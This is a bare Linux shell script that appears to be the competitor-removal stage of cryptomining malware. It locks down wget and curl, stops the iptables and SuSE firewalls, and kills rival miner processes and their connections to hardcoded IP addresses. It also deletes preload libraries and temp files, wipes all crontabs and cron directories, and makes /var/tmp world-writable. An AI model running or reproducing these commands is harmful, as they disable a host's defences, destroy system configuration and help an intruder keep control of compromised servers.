chattr +i /usr/bin/wget
chmod 700 /usr/bin/wget
chattr +i /usr/bin/curl
chmod 700 /usr/bin/curl
/etc/init.d/iptables stop
service iptables stop
SuSEfirewall2 stop
reSuSEfirewall2 stop
pkill -f sysxlj
pkill -f jourxlv
pkill -f sustes
rm -rf /etc/ld.so.preload
rm -rf /usr/lib/void.so
rm -rf /etc/voidonce.sh
rm -rf /usr/local/lib/libjdk.so
rm -rf /usr/local/lib/libntp.so
ps aux|grep "I2NvZGluZzogdXRmLTg"|grep -v grep|awk '{print $2}'|xargs kill -9
rm -rf /lib64/library1.so
rm -rf /usr/lib64/library1.so
rm -rf /lib64/library1.so
rm -rf /usr/lib64/library1.so
iptables -I OUTPUT -s 167.99.166.61 -j DROP
iptables -I INPUT -s 167.99.166.61 -j DROP
iptables -I OUTPUT -p tcp -m string --string "pastebin" --algo bm -j DROP
iptables -I OUTPUT -p udp -m string --string "pastebin" --algo kmp -j DROP
rm -rf /etc/cron.monthly/oanacroner  
rm -rf /etc/cron.daily/oanacroner
rm -rf /etc/cron.hourly/oanacroner
rm -rf /usr/local/bin/dns
echo "" > /etc/crontab
echo "" > /etc/cron.d/root
echo "" > /etc/cron.d/apache
echo "" > /var/spool/cron/root
echo "" > /var/spool/cron/crontabs/root
chkconfig --del netdns
pkill -f netdns
echo "" > /etc/cron.d/system
chmod 777 /var/tmp
rm -rf /usr/local/bin/dns
rm -rf /usr/sbin/netdns
rm -rf /etc/init.d/netdns
rm -rf /etc/cron.monthly/oanacroner  
rm -rf /etc/cron.daily/oanacroner
rm -rf /etc/cron.hourly/oanacroner
rm -rf /usr/local/lib/libntpd.so
pkill -f /usr/bin/.sshd
rm -rf /var/tmp/j*
rm -rf /tmp/j*
rm -rf /var/tmp/java
rm -rf /tmp/java
rm -rf /var/tmp/java2
rm -rf /tmp/java2
rm -rf /var/tmp/java*
rm -rf /tmp/java*
rm -rf /usr/lib/libiacpkmn.so.3
rm -rf /etc/init.d/nfstruncate
rm -rf /etc/rc.d/rc*.d/S01nfstruncate /bin/nfstruncate
rm -rf /tmp/qW3xT.2 /tmp/ddgs.3013 /tmp/ddgs.3012 /tmp/wnTKYg /tmp/2t3ik
rm -rf /boot/grub/deamon && rm -rf /boot/grub/disk_genius
rm -rf /tmp/*index_bak*
rm -rf /tmp/*httpd.conf*
rm -rf /tmp/*httpd.conf
rm -rf /tmp/a7b104c270
rm -rf /tmp/.uninstall* /tmp/.python* /tmp/.tables* /tmp/.mas
rm -rf /tmp/root.sh /tmp/pools.txt /tmp/libapache /tmp/config.json /tmp/bashf /tmp/bashg /tmp/libapache
rm -rf /var/spool/cron/crontabs
rm -rf /etc/cron.*
rm -rf /var/tmp/sustse* /var/tmp/wc.conf
rm -rf /var/tmp/jrm
rm -rf /tmp/jrm
pkill -f 185.222.210.59
pkill -f 95.142.40.81
pkill -f 192.99.142.232
netstat -anp | grep :13531 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
netstat -antp | grep '56415' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | xargs kill -9
netstat -antp | grep '139.99.120.75' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | xargs kill -9
netstat -antp | grep '27.155.87.59' | grep 'ESTABLISHED' | awk '{print $7}' |  xargs kill -9
netstat -antp | grep '27.155.87.59' | grep 'SYN_SENT' | awk '{print $7}'  | xargs kill -9
netstat -antp | grep '104.160.171.94\|170.178.178.57\|91.236.182.1\|52.15.72.79\|52.15.62.13' | grep 'ESTABLISHED' | awk '{print $7}'  | xargs kill -9
netstat -antp | grep '104.160.171.94\|170.178.178.57\|91.236.182.1\|52.15.72.79\|52.15.62.13' | grep 'CLOSE_WAIT' | awk '{print $7}'  | xargs kill -9
netstat -antp | grep '104.160.171.94\|170.178.178.57\|91.236.182.1\|52.15.72.79\|52.15.62.13' | grep 'SYN_SENT' | awk '{print $7}'  | xargs kill -9
netstat -antp | grep '121.18.238.56' | grep 'ESTABLISHED' | awk '{print $7}'  | xargs kill -9
netstat -antp | grep '121.18.238.56' | grep 'SYN_SENT' | awk '{print $7}'  | xargs kill -9
netstat -antp | grep '103.99.115.220' | grep 'SYN_SENT' | awk '{print $7}'  | xargs kill -9
netstat -antp | grep '103.99.115.220' | grep 'ESTABLISHED' | awk '{print $7}'  | xargs kill -9
